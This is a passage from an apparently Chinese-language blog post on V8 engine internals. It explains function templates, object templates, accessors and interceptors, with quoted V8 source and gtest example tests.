&#123;<br>    isolate-&gt;<span class="hljs-built_in">ReportPendingMessages</span>();<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">MaybeHandle</span>&lt;Object&gt;();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  isolate-&gt;<span class="hljs-built_in">clear_pending_message</span>();<br>&#125;<br><span class="hljs-keyword">return</span> value;<br></code></pre></td></tr></table></figure><p>测试代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;gtest/gtest.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;v8.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;libplatform/libplatform.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;v8_test_fixture.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;src/objects/objects.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;src/objects/objects-inl.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;src/api/api-inl.h&quot;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> v8;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">FunctionTemplateTest</span> : <span class="hljs-keyword">public</span> V8TestFixture &#123;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">function_callback</span><span class="hljs-params">(<span class="hljs-type">const</span> FunctionCallbackInfo&lt;Value&gt;&amp; info)</span> </span>&#123;<br>  Isolate* isolate = info.<span class="hljs-built_in">GetIsolate</span>();<br>  std::cout &lt;&lt; <span class="hljs-string">&quot;function_callback args= &quot;</span> &lt;&lt; info.<span class="hljs-built_in">Length</span>() &lt;&lt; <span class="hljs-string">&#x27;\n&#x27;</span>;<br><br>  <span class="hljs-comment">// If the function was called using the new operator the property</span><br>  <span class="hljs-comment">// new.target(NewTarget) will be set.</span><br>  Local&lt;Value&gt; new_target_value = info.<span class="hljs-built_in">NewTarget</span>();<br>  <span class="hljs-keyword">if</span> (new_target_value.<span class="hljs-built_in">IsEmpty</span>()) &#123;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;new_target_value is undefined: &quot;</span> &lt;&lt; new_target_value-&gt;<span class="hljs-built_in">IsUndefined</span>() &lt;&lt; <span class="hljs-string">&#x27;\n&#x27;</span>;<br>  &#125;<br>  <span class="hljs-comment">// This is the receiver passed as the second argument to the Call function,</span><br>  <span class="hljs-comment">// which is like the this.</span><br>  Local&lt;Object&gt; receiver = info.<span class="hljs-built_in">This</span>();<br>  Local&lt;Name&gt; name = String::<span class="hljs-built_in">NewFromUtf8</span>(isolate, <span class="hljs-string">&quot;nr&quot;</span>, NewStringType::kNormal).<span class="hljs-built_in">ToLocalChecked</span>();<br>  Local&lt;Value&gt; nr_local = receiver-&gt;<span class="hljs-built_in">GetRealNamedProperty</span>(isolate-&gt;<span class="hljs-built_in">GetCurrentContext</span>(), name).<span class="hljs-built_in">ToLocalChecked</span>();<br>  Local&lt;Number&gt; nr = nr_local-&gt;<span class="hljs-built_in">ToNumber</span>(isolate-&gt;<span class="hljs-built_in">GetCurrentContext</span>()).<span class="hljs-built_in">ToLocalChecked</span>();<br><br>  Local&lt;Object&gt; holder = info.<span class="hljs-built_in">Holder</span>();<br><br>  ReturnValue&lt;Value&gt; return_value = info.<span class="hljs-built_in">GetReturnValue</span>();<br>  <span class="hljs-type">double</span> nr2 = nr-&gt;<span class="hljs-built_in">Value</span>() + <span class="hljs-number">2</span>;<br>  return_value.<span class="hljs-built_in">Set</span>(nr2);<br><br>  <span class="hljs-built_in">EXPECT_STREQ</span>(*String::<span class="hljs-built_in">Utf8Value</span>(isolate, info.<span class="hljs-built_in">Data</span>()), <span class="hljs-string">&quot;some info&quot;</span>);<br>&#125;<br><br><span class="hljs-built_in">TEST_F</span>(FunctionTemplateTest, FunctionTemplate) &#123;<br>  i::Isolate* i_isolate = V8TestFixture::<span class="hljs-built_in">asInternal</span>(isolate_);<br>  <span class="hljs-function"><span class="hljs-type">const</span> HandleScope <span class="hljs-title">handle_scope</span><span class="hljs-params">(isolate_)</span></span>;<br>  Handle&lt;Context&gt; context = Context::<span class="hljs-built_in">New</span>(isolate_);<br>  <span class="hljs-function">Context::Scope <span class="hljs-title">context_scope</span><span class="hljs-params">(context)</span></span>;<br><br>  <span class="hljs-comment">// This value, data, will be made available via the FunctionCallbackInfo:</span><br>  Local&lt;Value&gt; data = String::<span class="hljs-built_in">NewFromUtf8</span>(isolate_, <span class="hljs-string">&quot;some info&quot;</span>, NewStringType::kNormal).<span class="hljs-built_in">ToLocalChecked</span>();<br>  Local&lt;FunctionTemplate&gt; ft = FunctionTemplate::<span class="hljs-built_in">New</span>(isolate_, function_callback, data);<br>  Local&lt;Function&gt; function = ft-&gt;<span class="hljs-built_in">GetFunction</span>(context).<span class="hljs-built_in">ToLocalChecked</span>();<br>  Local&lt;String&gt; func_name = String::<span class="hljs-built_in">NewFromUtf8</span>(isolate_, <span class="hljs-string">&quot;SomeFunc&quot;</span>, NewStringType::kNormal).<span class="hljs-built_in">ToLocalChecked</span>();<br>  function-&gt;<span class="hljs-built_in">SetName</span>(func_name);<br>  Local&lt;Value&gt; prototype = function-&gt;<span class="hljs-built_in">GetPrototype</span>();<br>  V8TestFixture::<span class="hljs-built_in">print_local</span>(prototype);<br><br>  Local&lt;Object&gt; recv = Object::<span class="hljs-built_in">New</span>(isolate_);<br>  Local&lt;Name&gt; name = String::<span class="hljs-built_in">NewFromUtf8</span>(isolate_, <span class="hljs-string">&quot;nr&quot;</span>, NewStringType::kNormal).<span class="hljs-built_in">ToLocalChecked</span>();<br>  Local&lt;Number&gt; value = Number::<span class="hljs-built_in">New</span>(isolate_, <span class="hljs-number">18</span>);<br>  recv-&gt;<span class="hljs-built_in">Set</span>(context, name, value).<span class="hljs-built_in">Check</span>();<br><br>  <span class="hljs-type">int</span> argc = <span class="hljs-number">0</span>;<br>  Local&lt;Value&gt; argv[] = &#123;&#125;; <br>  MaybeLocal&lt;Value&gt; ret = function-&gt;<span class="hljs-built_in">Call</span>(context, recv, argc, <span class="hljs-literal">nullptr</span>);<br>  <span class="hljs-keyword">if</span> (!ret.<span class="hljs-built_in">IsEmpty</span>()) &#123;<br>    Local&lt;Number&gt; nr = ret.<span class="hljs-built_in">ToLocalChecked</span>()-&gt;<span class="hljs-built_in">ToNumber</span>(context).<span class="hljs-built_in">ToLocalChecked</span>();<br>    <span class="hljs-built_in">EXPECT_EQ</span>(nr-&gt;<span class="hljs-built_in">Value</span>(), <span class="hljs-number">20</span>);<br>  &#125;<br><br>  i::RootsTable roots_table = i_isolate-&gt;<span class="hljs-built_in">roots_table</span>();<br>  i::Heap* heap = i_isolate-&gt;<span class="hljs-built_in">heap</span>();<br><br>  <span class="hljs-comment">//Local&lt;Function&gt; function2 = ft-&gt;GetFunction(context).ToLocalChecked();</span><br>  <span class="hljs-comment">//MaybeLocal&lt;Value&gt; ret = function-&gt;Call(context, recv, 0, nullptr);</span><br>&#125;<br><br><span class="hljs-built_in">TEST_F</span>(FunctionTemplateTest, FunctionTemplateInfo) &#123;<br>  <span class="hljs-function"><span class="hljs-type">const</span> HandleScope <span class="hljs-title">handle_scope</span><span class="hljs-params">(isolate_)</span></span>;<br>  Handle&lt;Context&gt; context = Context::<span class="hljs-built_in">New</span>(isolate_);<br>  <span class="hljs-function">Context::Scope <span class="hljs-title">context_scope</span><span class="hljs-params">(context)</span></span>;<br><br>  <span class="hljs-comment">// This value, data, will be made available via the FunctionCallbackInfo:</span><br>  Local&lt;Value&gt; data = String::<span class="hljs-built_in">NewFromUtf8</span>(isolate_, <span class="hljs-string">&quot;some info&quot;</span>, NewStringType::kNormal).<span class="hljs-built_in">ToLocalChecked</span>();<br>  Local&lt;FunctionTemplate&gt; ft = FunctionTemplate::<span class="hljs-built_in">New</span>(isolate_, function_callback, data);<br>  i::Handle&lt;i::FunctionTemplateInfo&gt; ft_info = i::<span class="hljs-built_in">Handle</span>&lt;i::FunctionTemplateInfo&gt;(<br>      <span class="hljs-built_in">reinterpret_cast</span>&lt;i::Address*&gt;(<span class="hljs-built_in">const_cast</span>&lt;FunctionTemplate*&gt;(*ft)));<br>  i::Isolate* i_isolate = V8TestFixture::<span class="hljs-built_in">asInternal</span>(isolate_);<br>  i::Handle&lt;i::SharedFunctionInfo&gt; sfi = i::FunctionTemplateInfo::<span class="hljs-built_in">GetOrCreateSharedFunctionInfo</span>(<br>      i_isolate, ft_info, i::<span class="hljs-built_in">MaybeHandle</span>&lt;i::Name&gt;());<br>  <span class="hljs-comment">//std::cout &lt;&lt; sfi-&gt;Name() &lt;&lt; &#x27;\n&#x27;;</span><br>  <span class="hljs-comment">//ft_info-&gt;GetCFunction(i_isolate);</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="对象模板object-template">对象模板（Object Template）</h2><p>每个函数模板都有一个相关联的对象模板，这用于配置使用此函数创建的对象作为其构造函数。对象模板用于在运行时创建对象，从对象模板被创建的对象会被挂上被加到这个模板中的属性，大概类似于<code>const obj = &#123;&#125;;</code></p><p>定义在<code>include/v8.h</code>中</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">V8_EXPORT</span> ObjectTemplate : <span class="hljs-keyword">public</span> Template &#123;<br>  ...<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">V8_EXPORT</span> Template : <span class="hljs-keyword">public</span> Data &#123;<br>  ...<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">V8_EXPORT</span> Data &#123;<br> <span class="hljs-keyword">private</span>:<br>  <span class="hljs-built_in">Data</span>();  <br>&#125;;<br></code></pre></td></tr></table></figure><p>我们创建一个对象模板的实例之后就可以给它添加属性，这样每个用该实例创建的对象实例都会带有该属性。此操作通过<code>Template</code>类中的成员函数<code>Set</code>实现，在<code>src/api/api.cc</code>中定义：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Template::Set</span><span class="hljs-params">(v8::Local&lt;Name&gt; name, v8::Local&lt;Data&gt; value,</span></span><br><span class="hljs-params"><span class="hljs-function">                   v8::PropertyAttribute attribute)</span> </span>&#123;<br>  <span class="hljs-keyword">auto</span> templ = Utils::<span class="hljs-built_in">OpenHandle</span>(<span class="hljs-keyword">this</span>);<br>  i::Isolate* isolate = templ-&gt;<span class="hljs-built_in">GetIsolate</span>();<br>  <span class="hljs-built_in">ENTER_V8_NO_SCRIPT_NO_EXCEPTION</span>(isolate);<br>  <span class="hljs-function">i::HandleScope <span class="hljs-title">scope</span><span class="hljs-params">(isolate)</span></span>;<br>  <span class="hljs-keyword">auto</span> value_obj = Utils::<span class="hljs-built_in">OpenHandle</span>(*value);<br><br>  Utils::<span class="hljs-built_in">ApiCheck</span>(!value_obj-&gt;<span class="hljs-built_in">IsJSReceiver</span>() || value_obj-&gt;<span class="hljs-built_in">IsTemplateInfo</span>(),<br>                  <span class="hljs-string">&quot;v8::Template::Set&quot;</span>,<br>                  <span class="hljs-string">&quot;Invalid value, must be a primitive or a Template&quot;</span>);<br><br>  <span class="hljs-comment">// The template cache only performs shallow clones, if we set an</span><br>  <span class="hljs-comment">// ObjectTemplate as a property value then we can not cache the receiver</span><br>  <span class="hljs-comment">// template.</span><br>  <span class="hljs-keyword">if</span> (value_obj-&gt;<span class="hljs-built_in">IsObjectTemplateInfo</span>()) &#123;<br>    templ-&gt;<span class="hljs-built_in">set_serial_number</span>(i::TemplateInfo::kDoNotCache);<br>  &#125;<br><br>  i::ApiNatives::<span class="hljs-built_in">AddDataProperty</span>(isolate, templ, Utils::<span class="hljs-built_in">OpenHandle</span>(*name),<br>                                 value_obj,<br>                                 <span class="hljs-built_in">static_cast</span>&lt;i::PropertyAttributes&gt;(attribute));<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Name</code>是<code>Symbol</code>和<code>String</code>的超类，它们都可以用作属性的名称。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">Local&lt;Value&gt; <span class="hljs-title">Private::Name</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123;<br>  <span class="hljs-type">const</span> Symbol* sym = <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">const</span> Symbol*&gt;(<span class="hljs-keyword">this</span>);<br>  i::Handle&lt;i::Symbol&gt; i_sym = Utils::<span class="hljs-built_in">OpenHandle</span>(sym);<br>  <span class="hljs-comment">// v8::Private symbols are created by API and are therefore writable, so we</span><br>  <span class="hljs-comment">// can always recover an Isolate.</span><br>  i::Isolate* isolate = i::<span class="hljs-built_in">GetIsolateFromWritableObject</span>(*i_sym);<br>  <span class="hljs-keyword">return</span> sym-&gt;<span class="hljs-built_in">Description</span>(<span class="hljs-built_in">reinterpret_cast</span>&lt;Isolate*&gt;(isolate));<br>&#125;<br></code></pre></td></tr></table></figure><p>样例代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;gtest/gtest.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;v8.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;libplatform/libplatform.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;v8_test_fixture.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;src/objects/objects.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;src/objects/objects-inl.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;src/api/api.h&quot;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> v8;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ObjectTemplateTest</span> : <span class="hljs-keyword">public</span> V8TestFixture &#123;<br>&#125;;<br><br><span class="hljs-built_in">TEST_F</span>(ObjectTemplateTest, AddProperty) &#123;<br>  <span class="hljs-function"><span class="hljs-type">const</span> HandleScope <span class="hljs-title">handle_scope</span><span class="hljs-params">(isolate_)</span></span>;<br>  Local&lt;FunctionTemplate&gt; constructor = <span class="hljs-built_in">Local</span>&lt;FunctionTemplate&gt;();<br>  Local&lt;ObjectTemplate&gt; ot = ObjectTemplate::<span class="hljs-built_in">New</span>(isolate_, constructor);<br><br>  <span class="hljs-comment">// Add a property that all instanced created from this object template will</span><br>  <span class="hljs-comment">// have. (Set is member function of class Template):</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span>* prop_name = <span class="hljs-string">&quot;prop_name&quot;</span>;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span>* prop_value = <span class="hljs-string">&quot;prop_value&quot;</span>;<br>  Local&lt;Name&gt; name = String::<span class="hljs-built_in">NewFromUtf8</span>(isolate_, prop_name, NewStringType::kNormal).<span class="hljs-built_in">ToLocalChecked</span>();<br>  Local&lt;Data&gt; value = String::<span class="hljs-built_in">NewFromUtf8</span>(isolate_, prop_value, NewStringType::kNormal).<span class="hljs-built_in">ToLocalChecked</span>();<br>  ot-&gt;<span class="hljs-built_in">Set</span>(name, value, PropertyAttribute::None);<br><br>  Handle&lt;Context&gt; context = Context::<span class="hljs-built_in">New</span>(isolate_, <span class="hljs-literal">nullptr</span>, ot);<br>  MaybeLocal&lt;Object&gt; maybe_instance = ot-&gt;<span class="hljs-built_in">NewInstance</span>(context);<br>  Local&lt;Object&gt; obj = maybe_instance.<span class="hljs-built_in">ToLocalChecked</span>();<br><br>  <span class="hljs-comment">// Verify that the property we added exist in the instance we created:</span><br>  MaybeLocal&lt;Array&gt; maybe_names = obj-&gt;<span class="hljs-built_in">GetPropertyNames</span>(context);<br>  Local&lt;Array&gt; names = maybe_names.<span class="hljs-built_in">ToLocalChecked</span>();<br>  <span class="hljs-built_in">EXPECT_EQ</span>(<span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">int</span>&gt;(names-&gt;<span class="hljs-built_in">Length</span>()), <span class="hljs-number">1</span>);<br>  <span class="hljs-comment">// If found it iteresting that Array does not have any methods except Length()</span><br>  <span class="hljs-comment">// and thress static methods (New, New, and Cast). Since Array extends Object</span><br>  <span class="hljs-comment">// we can use Object::Get with the index:</span><br>  Local&lt;Value&gt; name_from_array = names-&gt;<span class="hljs-built_in">Get</span>(context, <span class="hljs-number">0</span>).<span class="hljs-built_in">ToLocalChecked</span>();<br>  String::Utf8Value utf8_name&#123;isolate_, name_from_array&#125;;<br>  <span class="hljs-built_in">EXPECT_STREQ</span>(*utf8_name, prop_name);<br><br>  <span class="hljs-comment">// Verify the value is correct.</span><br>  Local&lt;Value&gt; val = obj-&gt;<span class="hljs-built_in">GetRealNamedProperty</span>(context, name).<span class="hljs-built_in">ToLocalChecked</span>();<br>  <span class="hljs-built_in">EXPECT_TRUE</span>(val-&gt;<span class="hljs-built_in">IsName</span>());<br>  String::Utf8Value utf8_value&#123;isolate_, val&#125;;<br>  <span class="hljs-built_in">EXPECT_STREQ</span>(*utf8_value, prop_value);<br>&#125;<br></code></pre></td></tr></table></figure><h3id="访问器accessor与拦截器interceptor">访问器（Accessor）与拦截器（Interceptor）</h3><p>访问器与拦截器是对象模板中两种不同的C++回调函数：</p><ul><li>访问器的回调函数会在模板对象生成的对象中指定属性被访问时执行</li><li>拦截器的回调函数会在模板对象生成的对象中任何属性被访问时执行</li></ul><p>可以使用ObjectTemplate的SetAccessor函数为对象模板或者对象创建一个访问器：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ObjectTemplate::SetAccessor</span><span class="hljs-params">(v8::Local&lt;String&gt; name,</span></span><br><span class="hljs-params"><span class="hljs-function">                                 AccessorGetterCallback getter,</span></span><br><span class="hljs-params"><span class="hljs-function">                                 AccessorSetterCallback setter,</span></span><br><span class="hljs-params"><span class="hljs-function">                                 v8::Local&lt;Value&gt; data, AccessControl settings,</span></span><br><span class="hljs-params"><span class="hljs-function">                                 PropertyAttribute attribute,</span></span><br><span class="hljs-params"><span class="hljs-function">                                 v8::Local&lt;AccessorSignature&gt; signature,</span></span><br><span class="hljs-params"><span class="hljs-function">                                 SideEffectType getter_side_effect_type,</span></span><br><span class="hljs-params"><span class="hljs-function">                                 SideEffectType setter_side_effect_type)</span> </span>&#123;<br>  <span class="hljs-built_in">TemplateSetAccessor</span>(<span class="hljs-keyword">this</span>, name, getter, setter, data, settings, attribute,<br>                      signature, i::FLAG_disable_old_api_accessors, <span class="hljs-literal">false</span>,<br>                      getter_side_effect_type, setter_side_effect_type);<br>&#125;<br></code></pre></td></tr></table></figure><p>其中name是访问器的属性名，getter是访问器的get函数，setter是访问器的set函数，其类型也可以为<code>v8::Local&lt;Name&gt; name, AccessorNameGetterCallback getter, AccessorNameSetterCallback setter</code>。</p><p>拦截器与访问器有相似之处，只不过访问器是针对某个特定的访问设置的getter和setter，而拦截器则是对于一个对象实例的所有相关访问进行拦截。一般一个对象模板有两种不同类型的拦截器可以设置：</p><ul><li><strong>映射型拦截器（Named Property Interceptor）</strong>：当对于一个对象内成员的访问方式是字符串型的属性名时，映射型拦截器就会生效，比如在Chrome浏览器中，文档中的一些访问就是映射型拦截器<code>document.theFormName.elementName</code></li><li><strong>索引型拦截器（Indexed Property Interceptor）</strong>：与映射型拦截器不同，索引型拦截器的访问与数组类似，通过整型下标来对内容进行访问。比如在Chrome浏览器中，<code>document.forms.elements[0]</code>这种形式的访问就是索引型拦截器的一种体现。</li></ul><p>对象模板通过<code>SetHandler</code>来对这个模板设置拦截器，通过传入不同类型的配置对象来决定设置的是映射型拦截器还是索引型拦截器。定义在<code>api.cc</code>中</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ObjectTemplate::SetHandler</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    <span class="hljs-type">const</span> NamedPropertyHandlerConfiguration&amp; config)</span> </span>&#123;<br>  <span class="hljs-built_in">ObjectTemplateSetNamedPropertyHandler</span>(<br>      <span class="hljs-keyword">this</span>, config.getter, config.setter, config.query, config.descriptor,<br>      config.deleter, config.enumerator, config.definer, config.data,<br>      config.flags);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ObjectTemplate::SetHandler</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    <span class="hljs-type">const</span> IndexedPropertyHandlerConfiguration&amp; config)</span> </span>&#123;<br>  i::Isolate* isolate = Utils::<span class="hljs-built_in">OpenHandle</span>(<span class="hljs-keyword">this</span>)-&gt;<span class="hljs-built_in">GetIsolate</span>();<br>  <span class="hljs-built_in">ENTER_V8_NO_SCRIPT_NO_EXCEPTION</span>(isolate);<br>  <span class="hljs-function">i::HandleScope <span class="hljs-title">scope</span><span class="hljs-params">(isolate)</span></span>;<br>  <span class="hljs-keyword">auto</span> cons = <span class="hljs-built_in">EnsureConstructor</span>(isolate, <span class="hljs-keyword">this</span>);<br>  <span class="hljs-built_in">EnsureNotPublished</span>(cons, <span class="hljs-string">&quot;v8::ObjectTemplate::SetHandler&quot;</span>);<br>  <span class="hljs-keyword">auto</span> obj = <span class="hljs-built_in">CreateIndexedInterceptorInfo</span>(<br>      isolate, config.getter, config.setter, config.query, config.descriptor,<br>      config.deleter, config.enumerator, config.definer, config.data,<br>      config.flags);<br>  i::FunctionTemplateInfo::<span class="hljs-built_in">SetIndexedPropertyHandler</span>(isolate, cons, obj);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>NamedPropertyHandlerConfiguration</code>类定义在<code>v8.h</code>中，这个类的对象用于配置一个映射型拦截器。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">NamedPropertyHandlerConfiguration</span> &#123;<br><br>  ...<br><br>  <span class="hljs-built_in">NamedPropertyHandlerConfiguration</span>(<br>      <span class="hljs-comment">/** Note: getter is required */</span><br>      GenericNamedPropertyGetterCallback getter = <span class="hljs-literal">nullptr</span>,<br>      GenericNamedPropertySetterCallback setter = <span class="hljs-literal">nullptr</span>,<br>      GenericNamedPropertyQueryCallback query = <span class="hljs-literal">nullptr</span>,<br>      GenericNamedPropertyDeleterCallback deleter = <span class="hljs-literal">nullptr</span>,<br>      GenericNamedPropertyEnumeratorCallback enumerator = <span class="hljs-literal">nullptr</span>,<br>      Local&lt;Value&gt; data = <span class="hljs-built_in">Local</span>&lt;Value&gt;(),<br>      PropertyHandlerFlags flags = PropertyHandlerFlags::kNone)<br>      : <span class="hljs-built_in">getter</span>(getter),<br>        <span class="hljs-built_in">setter</span>(setter),<br>        <span class="hljs-built_in">query</span>(query),<br>        <span class="hljs-built_in">deleter</span>(deleter),<br>        <span class="hljs-built_in">enumerator</span>(enumerator),<br>        <span class="hljs-built_in">definer</span>(<span class="hljs-literal">nullptr</span>),<br>        <span class="hljs-built_in">descriptor</span>(<span class="hljs-literal">nullptr</span>),<br>        <span class="hljs-built_in">data</span>(data),<br>        <span class="hljs-built_in">flags</span>(flags) &#123;&#125;<br><br>...<br>    <br>&#125;;<br></code></pre></td></tr></table></figure><p>我们重点关注它的构造函数，<code>getter</code>是拦截器的<code>getter</code>函数，其在函数内部为<code>info</code>返回<code>getter</code>的值。</p><figure class="highlight 